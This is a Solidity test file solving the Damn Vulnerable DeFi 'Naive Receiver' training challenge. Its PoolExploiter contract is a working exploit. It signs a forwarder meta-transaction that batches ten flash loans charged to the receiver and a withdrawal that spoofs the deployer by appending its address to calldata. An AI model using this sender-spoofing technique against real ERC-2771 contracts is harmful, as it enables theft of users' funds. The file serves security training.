// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
// import {ECDSA} from "solady/utils/ECDSA.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // ********************
        // 1. Our target is to deain receiver and pool's weth
        // 2. Upon brief inspection, reached a conclusion that FlashLoanReceiver.sol and Multicall is generally safe.
        // 3. Since this contract supports meta-transactions, and has a multicall(), I would assume that the exploitation
        // is related to it.
        // 4. The implementation of _msgSender in NaiveReceiverPool looks odd, and rings a huge bell
        // 5. The support of forwarder + multicall() + the implementation of _msgSender() for meta-transactions compatibility gives us
        // chances to maninupulate and pretend to be someone.
        // 6. If so, in order to drain receiver's 10 ETH, we just call flashloan on behalf of receiver for 10 times, and the 10 ETH will be drained.
        // 7. And then, we just pretend to be deployer, and withdraw it to the recovery address
        // 8. Since even we use multicall to call multiple functions on pool, Multicall contracts delegates the call to the Pool itself, makes the
        // msg.sender always will be the forwarder, thus fullfil (msg.sender == trustedForwarder && msg.data.length >= 20);
        // 9. Now let's code the solution out:
        // ********************

        new PoolExploiter(pool, weth, receiver, forwarder, recovery, deployer, playerPk);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}

contract PoolExploiter is Test {
    // ********************
    // 1. Our target is to deain receiver and pool's weth
    // 2. Upon brief inspection, reached a conclusion that FlashLoanReceiver.sol and Multicall is generally safe.
    // 3. Since this contract supports meta-transactions, and has a multicall(), I would assume that the exploitation
    // is related to it.
    // 4. The implementation of _msgSender in NaiveReceiverPool looks odd, and rings a huge bell
    // 5. The support of forwarder + multicall() + the implementation of _msgSender() for meta-transactions compatibility gives us
    // chances to maninupulate and pretend to be someone.
    // 6. If so, in order to drain receiver's 10 ETH, we just call flashloan on behalf of receiver for 10 times, and the 10 ETH will be drained.
    // 7. And then, we just pretend to be deployer, and withdraw it to the recovery address
    // 8. Since even we use multicall to call multiple functions on pool, Multicall contracts delegates the call to the Pool itself, makes the
    // msg.sender always will be the forwarder, thus fullfil (msg.sender == trustedForwarder && msg.data.length >= 20);
    // 9. Several concepts: say for a function approve(address, uint256), if is encoded with function selector + address + uint256, and append gibberish
    // bytes behind it, it will still be correctly interprated.
    // 9. Now let's code the solution out:
    // ********************

    // struct Request {
    //     address from;
    //     address target;
    //     uint256 value;
    //     uint256 gas;
    //     uint256 nonce;
    //     bytes data;
    //     uint256 deadline;
    // }

    // We need 12 transactions:
    // 1 transation to deposit on behalf of player
    // 1 transaction to withdraw on behalf of player
    // 10 flash loan transactions to pretend to be be receiver

    address owner;
    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;
    address recovery;
    address deployer;
    uint256 playerPk;

    constructor(
        NaiveReceiverPool _pool,
        WETH _weth,
        FlashLoanReceiver _receiver,
        BasicForwarder _forwarder,
        address _recovery,
        address _deployer,
        uint256 _playerPk
    ) {
        owner = msg.sender;
        pool = _pool;
        weth = _weth;
        receiver = _receiver;
        forwarder = _forwarder;
        recovery = _recovery;
        deployer = _deployer;
        playerPk = _playerPk;

        // bytes container for multicall use
        bytes[] memory multicallDataBody = new bytes[](12);

        // deposit data construction
        bytes memory depositData = abi.encodeWithSelector(pool.deposit.selector);
        multicallDataBody[0] = depositData;

        // malicious flash loan data construction
        bytes memory flashLoanData =
            abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 1 ether, "0x");
        bytes memory maliciousFlashLoanData = abi.encodePacked(flashLoanData, address(receiver));

        for (uint256 i = 1; i < 11; i++) {
            multicallDataBody[i] = maliciousFlashLoanData;
        }

        // malicious withdrawal data construction
        bytes memory withdrawData = abi.encodeWithSelector(pool.withdraw.selector, 1010 ether, recovery);
        bytes memory maliciousWithdrawData = abi.encodePacked(withdrawData, deployer);
        multicallDataBody[11] = maliciousWithdrawData;

        // multicall data construction
        bytes memory multicallData = abi.encodeWithSelector(Multicall.multicall.selector, multicallDataBody);

        // Sign EIP-712
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: owner,
            target: address(pool),
            value: 0,
            gas: gasleft(), // or a specific gas limit
            nonce: forwarder.nonces(owner),
            data: multicallData,
            deadline: block.timestamp + 1
        });

        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 dataHash = forwarder.getDataHash(request);
        bytes32 digest = ECDSA.toTypedDataHash(domainSeparator, dataHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        bool success = forwarder.execute{value: 0}(request, signature);
    }

    receive() external payable {}
}

/**
 * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.
 *
 * These functions can be used to verify that a message was signed by the holder
 * of the private keys of a given address.
 */
library ECDSA {
    /**
     * @dev Overload of {ECDSA-recover} that receives the `v`,
     * `r` and `s` signature fields separately.
     */
    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature
        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines
        // the valid range for s in (281): 0 < s < secp256k1n ÷ 2 + 1, and for v in (282): v ∈ {27, 28}. Most
        // signatures from current libraries generate a unique signature with an s-value in the lower half order.
        //
        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value
        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or
        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept
        // these malleable signatures as well.
        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "ISS");
        require(v == 27 || v == 28, "ISV");

        // If the signature is valid (and not malleable), return the signer address
        address signer = ecrecover(hash, v, r, s);
        require(signer != address(0), "IS");

        return signer;
    }

    /**
     * @dev Returns an Ethereum Signed Typed Data, created from a
     * `domainSeparator` and a `structHash`. This produces hash corresponding
     * to the one signed with the
     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`]
     * JSON-RPC method as part of EIP-712.
     *
     * See {recover}.
     */
    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }
}
